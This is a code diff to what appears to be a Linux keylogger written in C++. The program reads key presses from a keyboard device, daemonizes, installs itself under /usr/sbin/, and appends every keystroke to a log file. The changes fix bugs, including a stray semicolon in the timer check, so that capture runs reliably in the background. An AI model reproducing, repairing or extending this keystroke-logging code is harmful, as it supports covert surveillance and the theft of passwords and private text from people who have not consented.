@@ -60,10 +60,8 @@ int main(int argc, char **argv)
         fleObj.open(path, std::ios::app | std::ios::ate);
 
     if(!fleObj.is_open() && isFile)
-    {
-        fleObj.close();  
         throw std::runtime_error("Error while opening the given log file");
-    }     
+
     if(!checkForConquer())
     {
         std::string installPath = "/usr/sbin/";
@@ -80,10 +78,7 @@ int main(int argc, char **argv)
     TimerUnit timeController(timeInterval);
     if(!isStdOut)
         if(daemon(1, 1) != 0)
-        {
-            fleObj.close();        
             throw std::runtime_error("Unable to initialize the daemon");
-        }  
 
     while(read(kbd_Fd, &eve, sizeof(input_event)) > 0)
     {
@@ -106,10 +101,11 @@ int main(int argc, char **argv)
         if(isFile && eve.value == KEY_PRESS && eve.type == EV_KEY)
             fleObj << keyWord;
 
-        if(timeController.checkTime());
-        
-        fleObj.close();
-        fleObj.open(path, std::ios::app | std::ios::ate);
+        if(timeController.checkTime())
+        {
+            fleObj.close();
+            fleObj.open(path, std::ios::app | std::ios::ate);
+        }
     }
     close(kbd_Fd);
     fleObj.close();
